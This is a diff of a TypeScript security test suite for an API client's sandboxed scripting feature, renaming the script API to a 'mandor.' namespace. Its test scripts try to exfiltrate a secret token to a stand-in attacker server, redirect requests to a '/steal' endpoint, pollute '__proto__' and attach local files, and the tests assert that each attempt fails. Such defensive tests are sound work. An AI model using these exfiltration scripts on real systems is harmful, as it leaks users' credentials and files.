@@ -40,13 +40,13 @@ async function writeCollectionHeaders(...pairs: [string, string][]): Promise<voi
 }
 
 describe('a script that reads or fills a secret', () => {
-    it('reads no secret: vars.get gives undefined, and the console says so', async () => {
+    it('reads no secret: mandor.variables.get gives undefined, and the console says so', async () => {
         await attack.send({
             url: '{{baseUrl}}/echo',
             ...scripts(`
-                const got = vars.get('token');
-                request.headers.set('X-Got', String(got));
-                await sendRequest({ url: '${attack.evil.url}/get', method: 'POST', body: String(got) });
+                const got = mandor.variables.get('token');
+                mandor.request.headers.set('X-Got', String(got));
+                await mandor.sendRequest({ url: '${attack.evil.url}/get', method: 'POST', body: String(got) });
             `),
         });
 
@@ -64,7 +64,7 @@ describe('a script that reads or fills a secret', () => {
         await attack.send({
             url: '{{baseUrl}}/echo',
             headers: [line('X-Copy', '{{x}}')],
-            ...scripts(`vars.set('x', '{{token}}');`),
+            ...scripts(`mandor.variables.set('x', '{{token}}');`),
         });
 
         nothingLeft();
@@ -75,10 +75,10 @@ describe('a script that reads or fills a secret', () => {
         await attack.send({
             url: '{{baseUrl}}/echo',
             ...scripts(`
-                request.headers.set('X-Direct', '{{token}}');
-                request.headers.set('X-Nested', '{{a}}');
-                vars.set('b', '{{a}}');
-                request.headers.set('X-Twice', '{{b}}');
+                mandor.request.headers.set('X-Direct', '{{token}}');
+                mandor.request.headers.set('X-Nested', '{{a}}');
+                mandor.variables.set('b', '{{a}}');
+                mandor.request.headers.set('X-Twice', '{{b}}');
             `),
         });
 
@@ -90,9 +90,9 @@ describe('a script that reads or fills a secret', () => {
         await writeCollectionHeaders(['X-One', '1'], ['X-Two', '2']);
 
         const sources = [
-            `request.headers.set('X-Api-Key', '{{token}}');`,
-            `request.headers.delete('X-One'); request.headers.set('X-Api-Key', '{{token}}');`,
-            `request.headers.set('X-Two', '{{token}}');`,
+            `mandor.request.headers.set('X-Api-Key', '{{token}}');`,
+            `mandor.request.headers.delete('X-One'); mandor.request.headers.set('X-Api-Key', '{{token}}');`,
+            `mandor.request.headers.set('X-Two', '{{token}}');`,
         ];
 
         for (const source of sources) {
@@ -112,7 +112,7 @@ describe('a script that reads or fills a secret', () => {
             method: 'POST',
             url: '{{baseUrl}}/gists',
             body: { type: 'json', content: '{}' },
-            ...scripts(`request.body = '{{token}}';`),
+            ...scripts(`mandor.request.body = '{{token}}';`),
         });
 
         nothingLeft();
@@ -123,7 +123,7 @@ describe('a script that reads or fills a secret', () => {
         await attack.send({
             url: '{{baseUrl}}/echo',
             headers: [KEY_LINE],
-            ...scripts(`test('reads', () => request.headers.get('x-api-key'));`),
+            ...scripts(`mandor.test('reads', () => mandor.request.headers.get('x-api-key'));`),
         });
 
         expect(attack.received[0]?.headers['x-api-key']).toBe(SECRET);
@@ -136,10 +136,10 @@ describe('a script that reaches outside what it may touch', () => {
             url: '{{baseUrl}}/echo',
             headers: [line('X-Proto', '{{__proto__}}')],
             ...scripts(`
-                vars.set('__proto__', '{{token}}');
-                vars.set('constructor', '{{token}}');
-                request.headers.set('__proto__', '{{token}}');
-                request.query.set('__proto__', '{{token}}');
+                mandor.variables.set('__proto__', '{{token}}');
+                mandor.variables.set('constructor', '{{token}}');
+                mandor.request.headers.set('__proto__', '{{token}}');
+                mandor.request.query.set('__proto__', '{{token}}');
             `),
         });
 
@@ -160,7 +160,7 @@ describe('a script that reaches outside what it may touch', () => {
                     method: 'POST',
                     url: '{{baseUrl}}/echo',
                     body: { type: 'form', fields: [{ ...line('f', '{{file}}'), kind: 'file' }] },
-                    ...scripts(`vars.set('file', ${JSON.stringify(path)});`),
+                    ...scripts(`mandor.variables.set('file', ${JSON.stringify(path)});`),
                 });
             }
         } finally {
@@ -178,7 +178,7 @@ describe('a script that reaches outside what it may touch', () => {
             method: 'POST',
             url: '{{baseUrl}}/echo',
             body: { type: 'text', content: 'x' },
-            ...scripts(`request.body = '.mandor/kept.txt';`),
+            ...scripts(`mandor.request.body = '.mandor/kept.txt';`),
         });
 
         expect(attack.received[0]?.body).toBe('.mandor/kept.txt');
@@ -195,7 +195,7 @@ describe('a script nobody approved', () => {
         await attack.send({
             url: '{{baseUrl}}/echo',
             headers: [KEY_LINE],
-            ...scripts(`request.url = '${attack.evil.url}/steal';`),
+            ...scripts(`mandor.request.url = '${attack.evil.url}/steal';`),
         });
 
         expect(attack.evil.hits).toEqual([]);
@@ -206,14 +206,17 @@ describe('a script nobody approved', () => {
     it('does not run once its text changed after it was approved', async () => {
         const request = { url: '{{baseUrl}}/echo', headers: [KEY_LINE] };
 
-        await attack.send({ ...request, ...scripts(`request.headers.set('X-Run', '1');`) });
+        await attack.send({ ...request, ...scripts(`mandor.request.headers.set('X-Run', '1');`) });
 
         for (const key of attack.asked) {
             attack.approved.add(key);
         }
 
-        await attack.send({ ...request, ...scripts(`request.headers.set('X-Run', '1');`) });
-        await attack.send({ ...request, ...scripts(`request.url = '${attack.evil.url}/steal';`) });
+        await attack.send({ ...request, ...scripts(`mandor.request.headers.set('X-Run', '1');`) });
+        await attack.send({
+            ...request,
+            ...scripts(`mandor.request.url = '${attack.evil.url}/steal';`),
+        });
 
         expect(attack.received.map(({ headers }) => headers['x-run'])).toEqual([
             undefined,
